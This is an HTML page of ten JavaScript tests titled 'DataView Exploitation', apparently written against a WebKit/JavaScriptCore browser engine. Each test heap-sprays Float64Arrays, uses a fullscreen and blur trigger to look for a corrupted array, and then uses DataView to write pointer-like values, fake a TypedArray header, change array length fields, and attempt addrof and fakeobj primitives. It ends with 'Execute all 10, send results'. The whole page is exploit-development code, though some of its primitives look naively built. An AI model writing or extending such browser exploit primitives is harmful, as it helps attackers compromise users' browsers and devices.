<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>DataView Battery</title>

</head>
<body>

<h1>DATAVIEW EXPLOITATION - 10 TESTS</h1>

<h2>TEST 1: Write at Different Offsets</h2>
<button onclick="t1()">RUN</button>
<div id="r1"></div>
<script>
function t1() {
    const r = document.getElementById('r1');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        const v = new DataView(c.buffer);
        
        // Write at multiple offsets
        const tests = [
            {off: 0, val: 0xAABBCCDD},
            {off: 8, val: 0x11223344},
            {off: 16, val: 0x55667788},
            {off: 24, val: 0x99AABBCC},
            {off: 32, val: 0xDDEEFF00},
            {off: 40, val: 0x12345678},
            {off: 48, val: 0x9ABCDEF0},
            {off: 56, val: 0x13579BDF}
        ];
        
        r.innerHTML = 'Writing:<br>';
        for(let t of tests) {
            v.setUint32(t.off, t.val, true);
            const check = v.getUint32(t.off, true);
            r.innerHTML += t.off + ': ' + (check === t.val ? 'OK' : 'FAIL') + '<br>';
        }
    };
}
</script>

<hr>

<h2>TEST 2: Read/Write Qwords (64-bit)</h2>
<button onclick="t2()">RUN</button>
<div id="r2"></div>
<script>
function t2() {
    const r = document.getElementById('r2');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        const v = new DataView(c.buffer);
        
        const qwords = [
            0x0011223344556677n,
            0x8899AABBCCDDEEFFn, /* CORRIGIDO: Removido espaco antes do 'n' */
            0xFEDCBA9876543210n,
            0x123456789ABCDEFn,
            0xDEADBEEFCAFEBABEn,
            0x4141414141414141n,
            0x4242424242424242n,
            0x1337133713371337n
        ];
        
        r.innerHTML = 'Qword R/W:<br>';
        for(let i = 0; i < qwords.length; i++) {
            const off = i * 8;
            v.setBigUint64(off, qwords[i], true);
            const check = v.getBigUint64(off, true);
            r.innerHTML += off + ': ' + (check === qwords[i] ? 'OK' : 'FAIL') + '<br>';
        }
    };
}
</script>

<hr>

<h2>TEST 3: Pointer-like Values</h2>
<button onclick="t3()">RUN</button>
<div id="r3"></div>
<script>
function t3() {
    const r = document.getElementById('r3');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        const v = new DataView(c.buffer);
        
        // Write pointer-like addresses
        const ptrs = [
            0x7f0000001000n,
            0x7fff00000000n,
            0x100000000n,
            0x200000000n,
            0x7f8a3c5d2140n,
            0x108000000n,
            0x41424344n,
            0x7fffffffn
        ];
        
        r.innerHTML = 'Pointer values:<br>';
        for(let i = 0; i < ptrs.length; i++) {
            const off = i * 8;
            v.setBigUint64(off, ptrs[i], true);
            const check = v.getBigUint64(off, true);
            r.innerHTML += off + ': 0x' + check.toString(16) + ' ' + (check === ptrs[i] ? 'OK' : 'FAIL') + '<br>';
        }
    };
}
</script>

<hr>

<h2>TEST 4: Float â†” Int Confusion</h2>
<button onclick="t4()">RUN</button>
<div id="r4"></div>
<script>
function t4() {
    const r = document.getElementById('r4');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        const v = new DataView(c.buffer);
        
        r.innerHTML = 'Float/Int confusion:<br>';
        
        // Write as float, read as int
        const testFloat = 3.14159265359;
        v.setFloat64(0, testFloat, true);
        const asInt = v.getBigUint64(0, true);
        r.innerHTML += 'Float ' + testFloat + ' as int: 0x' + asInt.toString(16) + '<br>';
        
        // Write as int, read as float
        const testInt = 0x4142434445464748n;
        v.setBigUint64(8, testInt, true);
        const asFloat = v.getFloat64(8, true);
        r.innerHTML += 'Int 0x' + testInt.toString(16) + ' as float: ' + asFloat + '<br>';
        
        // Use corrupted array to read
        const fromArray = c[0];
        r.innerHTML += 'From array[0]: ' + fromArray + '<br>';
        
        // Convert
        const buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = fromArray;
        const converted = new BigUint64Array(buf)[0];
        r.innerHTML += 'Converted: 0x' + converted.toString(16) + '<br>';
    };
}
</script>

<hr>

<h2>TEST 5: Write Pattern, Scan for It</h2>
<button onclick="t5()">RUN</button>
<div id="r5"></div>
<script>
function t5() {
    const r = document.getElementById('r5');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        const v = new DataView(c.buffer);
        
        // Write unique pattern at offset 24
        const pattern = 0xBEEFCAFEn;
        v.setUint32(24, pattern, true);
        
        r.innerHTML = 'Pattern 0x' + pattern.toString(16) + ' written at offset 24<br>';
        r.innerHTML += 'Scanning all arrays:<br>';
        
        // Scan all arrays for pattern
        let found = 0;
        for(let i = 0; i < arrays.length; i++) {
            const arr = arrays[i];
            for(let j = 0; j < arr.length; j++) {
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = arr[j];
                const dw = new DataView(buf);
                const val = dw.getUint32(0, true);
                
                if(val === pattern) {
                    r.innerHTML += 'Found in array[' + i + '][' + j + ']<br>';
                    found++;
                }
            }
        }
        
        r.innerHTML += 'Total found: ' + found + '<br>';
    };
}
</script>

<hr>

<h2>TEST 6: Fake TypedArray Header</h2>
<button onclick="t6()">RUN</button>
<div id="r6"></div>
<script>
function t6() {
    const r = document.getElementById('r6');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        const v = new DataView(c.buffer);
        
        r.innerHTML = 'Creating fake TypedArray header:<br>';
        
        // JSCell header (8 bytes)
        v.setUint32(0, 0x0108, true); // StructureID
        v.setUint32(4, 0x25, true);   // IndexingType + JSType
        r.innerHTML += 'JSCell header written<br>';
        
        // Butterfly pointer (8 bytes)
        v.setBigUint64(8, 0x0n, true);
        r.innerHTML += 'Butterfly: null<br>';
        
        // ArrayBuffer backing store (8 bytes)
        v.setBigUint64(16, 0x4142434445464748n, true);
        r.innerHTML += 'Backing store: 0x4142434445464748<br>';
        
        // Length (8 bytes)
        v.setBigUint64(24, 0x1000n, true);
        r.innerHTML += 'Length: 4096<br>';
        
        // Byte offset (4 bytes)
        v.setUint32(32, 0, true);
        r.innerHTML += 'Byte offset: 0<br>';
        
        // Verify
        r.innerHTML += '<br>Readback:<br>';
        r.innerHTML += '0: 0x' + v.getBigUint64(0, true).toString(16) + '<br>';
        r.innerHTML += '8: 0x' + v.getBigUint64(8, true).toString(16) + '<br>';
        r.innerHTML += '16: 0x' + v.getBigUint64(16, true).toString(16) + '<br>';
        r.innerHTML += '24: 0x' + v.getBigUint64(24, true).toString(16) + '<br>';
    };
}
</script>

<hr>

<h2>TEST 7: Modify Array Length Field</h2>
<button onclick="t7()">RUN</button>
<div id="r7"></div>
<script>
function t7() {
    const r = document.getElementById('r7');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Original length: ' + c.length + '<br>';
        r.innerHTML += 'Original byteLength: ' + c.byteLength + '<br>';
        
        const v = new DataView(c.buffer);
        
        // Try to find and modify length field
        r.innerHTML += '<br>Searching for length field:<br>';
        
        // Length is typically at a specific offset in TypedArray structure
        // Try common offsets
        const offsets = [24, 32, 40, 48];
        
        for(let off of offsets) {
            const val = v.getBigUint64(off, true);
            r.innerHTML += 'Offset ' + off + ': 0x' + val.toString(16);
            
            if(val === 8n || val === 64n) {
                r.innerHTML += ' (LENGTH CANDIDATE)<br>';
                
                // Try modifying
                v.setBigUint64(off, 128n, true);
                r.innerHTML += 'Modified to 128<br>';
                r.innerHTML += 'New length: ' + c.length + '<br>';
            } else {
                r.innerHTML += '<br>';
            }
        }
    };
}
</script>

<hr>

<h2>TEST 8: Cross-Array Read via DataView</h2>
<button onclick="t8()">RUN</button>
<div id="r8"></div>
<script>
function t8() {
    const r = document.getElementById('r8');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        const v = new DataView(c.buffer);
        
        // Write marker
        v.setBigUint64(16, 0xABCDEF0123456789n, true);
        
        r.innerHTML = 'Marker written at offset 16<br>';
        r.innerHTML += 'Checking spray arrays:<br>';
        
        let found = 0;
        for(let i = 0; i < Math.min(1000, spray.length); i++) {
            const s = spray[i];
            for(let j = 0; j < s.length; j++) {
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = s[j];
                const val = new BigUint64Array(buf)[0];
                
                if(val === 0xABCDEF0123456789n) {
                    r.innerHTML += 'Found in spray[' + i + '][' + j + ']<br>';
                    found++;
                    if(found >= 3) break;
                }
            }
            if(found >= 3) break;
        }
        
        r.innerHTML += 'Total matches: ' + found + '<br>';
    };
}
</script>

<hr>

<h2>TEST 9: Construct addrof via DataView</h2>
<button onclick="t9()">RUN</button>
<div id="r9"></div>
<script>
function t9() {
    const r = document.getElementById('r9');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        const v = new DataView(c.buffer);
        
        r.innerHTML = 'Attempting addrof construction:<br>';
        
        // Create object
        const obj = {marker: 0xDEADBEEF};
        
        // Convert to Array
        const arr = Array.from(c);
        
        // Store object
        arr[4] = obj;
        
        r.innerHTML += 'Object stored in arr[4]<br>';
        
        // Try reading from corrupted
        const leaked = c[4];
        r.innerHTML += 'c[4] = ' + leaked + '<br>';
        
        // Convert to hex
        const buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = leaked;
        const addr = new BigUint64Array(buf)[0];
        
        r.innerHTML += 'As hex: 0x' + addr.toString(16) + '<br>';
        
        if(addr !== 0n && addr !== P) {
            r.innerHTML += '<b>POTENTIAL ADDRESS LEAK</b><br>';
            
            // Try with DataView
            v.setFloat64(32, leaked, true);
            const viaView = v.getBigUint64(32, true);
            r.innerHTML += 'Via DataView: 0x' + viaView.toString(16) + '<br>';
        }
    };
}
</script>

<hr>

<h2>TEST 10: Build fakeobj via DataView</h2>
<button onclick="t10()">RUN</button>
<div id="r10"></div>
<script>
function t10() {
    const r = document.getElementById('r10');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        const v = new DataView(c.buffer);
        
        r.innerHTML = 'Building fakeobj:<br>';
        
        // Write fake address as float
        const fakeAddr = 0x4142434445464748n;
        v.setBigUint64(40, fakeAddr, true);
        
        r.innerHTML += 'Fake addr written: 0x' + fakeAddr.toString(16) + '<br>';
        
        // Read as float
        const asFloat = v.getFloat64(40, true);
        r.innerHTML += 'As float: ' + asFloat + '<br>';
        
        // Try to use via Array
        const arr = Array.from(c);
        arr[5] = asFloat;
        
        r.innerHTML += 'Stored in arr[5]<br>';
        
        // Try reading back
        const readback = arr[5];
        r.innerHTML += 'Readback: ' + readback + '<br>';
        r.innerHTML += 'Type: ' + typeof readback + '<br>';
        
        if(typeof readback === 'object' && readback !== null) {
            r.innerHTML += '<b>FAKEOBJ CREATED</b><br>';
        }
    };
}
</script>

<p>Execute all 10, send results</p>

</body>
</html>
